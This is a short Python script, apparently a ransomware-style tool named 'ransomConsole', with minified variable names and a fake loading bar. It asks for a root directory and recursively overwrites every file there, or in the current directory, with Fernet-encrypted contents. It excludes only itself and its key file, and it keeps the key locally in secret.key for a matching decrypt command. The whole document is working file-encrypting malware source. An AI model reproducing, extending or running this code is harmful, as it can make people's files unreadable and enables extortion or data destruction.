#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
from rich.progress import track
import time
for i in track(range(100),description='Loading program...'):time.sleep(.03)
CMDS=['version','encrypt.all','decrypt.all','encrypt.dir','decrypt.dir']
VER='0.0.2-Pro remake'
KEY_PATH='secret.key'
EXCLUDED=['console.py','console',KEY_PATH,'ransomConsole-0.0.2-Pro.tar.gz','Makefile']
if not os.path.exists(KEY_PATH):
	key=Fernet.generate_key()
	with open(KEY_PATH,'wb')as f:f.write(key)
else:
	with open(KEY_PATH,'rb')as f:key=f.read()
def encrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as B:C=B.read()
		with open(A,'wb')as B:B.write(Fernet(key).encrypt(C))
	print(f"Encrypted {A}")
def encryptAll(rootDir):
	for(A,E,B)in os.walk(rootDir):
		for C in B:D=os.path.join(A,C);encrypt(D)
def decrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as B:C=B.read()
		with open(A,'wb')as B:B.write(Fernet(key).decrypt(C))
	print(f"Decrypted {A}")
def decryptAll(rootDir):
	for(A,E,B)in os.walk(rootDir):
		for C in B:D=os.path.join(A,C);decrypt(D)
def main():
	C=input('Enter your root directory: ')or'.';A=input('Enter your command: ')
	if A==CMDS[0]:print(VER)
	elif A==CMDS[1]:encryptAll(C)
	elif A==CMDS[2]:decryptAll(C)
	elif A==CMDS[3]:
		for B in os.listdir():encrypt(B)
	elif A==CMDS[4]:
		for B in os.listdir():decrypt(B)
	else:
		print('Error: command not found. Try with:')
		for D in CMDS:print(D)
if __name__=='__main__':main()